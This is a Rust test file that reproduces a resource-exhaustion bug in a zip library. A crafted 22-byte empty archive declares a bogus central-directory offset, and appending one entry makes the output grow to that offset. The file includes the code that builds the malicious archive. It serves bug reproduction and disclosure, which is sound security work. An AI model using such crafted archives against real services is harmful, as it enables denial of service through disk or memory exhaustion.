//! zip-5 (resource-exhaustion): an empty archive's EOCD can declare a central
//! directory offset far past the EOCD. find_central_directory returns early for
//! zero entries, before the offset-consistency check (src/spec.rs:666,675), so
//! ZipArchive::new accepts it; get_metadata seeks to that offset
//! (src/read.rs:697) and ZipWriter::new_append inherits it as the write
//! position. Appending one tiny entry then grows the output to about the
//! declared offset, from a 22-byte input.
//!
//! Measurement: two declared offsets. The output length tracks the offset
//! (linear growth from a constant 22-byte input), not the amount written.
//! Offsets are kept modest so the output stays well inside the memory limit.
//! Exit 0 only if both appends succeed and output ≈ the declared offset.

use std::io::{Cursor, Write};
use zip::write::SimpleFileOptions;
use zip::{CompressionMethod, ZipArchive, ZipWriter};

/// A 22-byte EOCD with no entries and the given central-directory offset.
fn empty_eocd(cd_offset: u32) -> Vec<u8> {
    let mut v = Vec::new();
    v.extend_from_slice(b"PK\x05\x06");
    v.extend_from_slice(&[0; 8]); // disk numbers and entry counts (all zero)
    v.extend_from_slice(&0u32.to_le_bytes()); // central directory size
    v.extend_from_slice(&cd_offset.to_le_bytes());
    v.extend_from_slice(&0u16.to_le_bytes()); // comment length
    v
}

fn output_len_for_offset(cd_offset: u32) -> usize {
    let data = empty_eocd(cd_offset);
    assert_eq!(data.len(), 22);
    // Baseline accepts the empty archive despite the bogus offset.
    let archive = ZipArchive::new(Cursor::new(data.clone())).expect("empty archive opens");
    assert_eq!(archive.len(), 0);

    let mut w = ZipWriter::new_append(Cursor::new(data)).expect("new_append");
    let opts = SimpleFileOptions::default().compression_method(CompressionMethod::Stored);
    w.start_file("a.txt", opts).unwrap();
    w.write_all(b"hello").unwrap();
    w.finish().unwrap().into_inner().len()
}

#[test]
fn append_grows_output_to_declared_offset() {
    let off1: u32 = 0x0100_0000; // 16 MiB
    let off2: u32 = 0x0300_0000; // 48 MiB
    let out1 = output_len_for_offset(off1);
    let out2 = output_len_for_offset(off2);
    eprintln!("22-byte input, declared CD offset {off1:#x} -> output {out1} bytes");
    eprintln!("22-byte input, declared CD offset {off2:#x} -> output {out2} bytes");
    assert!(
        out1 >= off1 as usize && out2 >= off2 as usize,
        "BUG NOT PRESENT: output ({out1}, {out2}) did not grow to the declared offsets"
    );
    assert!(out2 > out1, "output should grow with the declared offset");
    eprintln!(
        "REPRODUCED: a 22-byte archive grew to {}MiB and {}MiB on append; output tracks the attacker-declared offset",
        out1 / (1024 * 1024),
        out2 / (1024 * 1024)
    );
}
